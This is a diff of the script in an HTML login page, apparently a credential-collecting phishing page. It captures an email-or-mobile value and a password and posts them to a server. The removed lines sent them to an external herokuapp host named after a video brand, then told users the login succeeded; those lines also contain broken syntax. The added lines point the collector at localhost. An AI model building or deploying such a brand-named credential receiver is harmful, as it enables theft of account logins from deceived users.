@@ -74,36 +74,35 @@
     </div>
 <!-- Script aitomation procces/backend data reciver -->
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault();
+        document.getElementById('loginForm').
+addEventListener('submit', function(event) {
+    event.preventDefault();
 
-      const emailOrMobile = document.getElementById('emailOrMobile').value;
-      const password = document.getElementById('password').value;
+    const emailOrMobile = document.getElementById('emailOrMobile').value;
+    const password = document.getElementById('password').value;
 
-      fetch('https://YouTube-Video.herokuapp.com/login', {
+    fetch('http://localhost/login.php', {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json'
+            'Content-Type': 'application/json'
         },
         body: JSON.stringify({ emailOrMobile, password })
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Success:', data);
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-      });
-
-   
-  
-          alert('Login successful'); // Notify user
-            });
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Login failed'); // Notify user
-            });
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('Success:', data);
+            alert('Login successful'); // Notify user
+        } else {
+            console.error('Login failed:', data.message);
+            alert('Login failed: ' + data.message);
         }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('An error occurred. Please try again.');
+    });
+});
     </script>
 </body>
 </html>
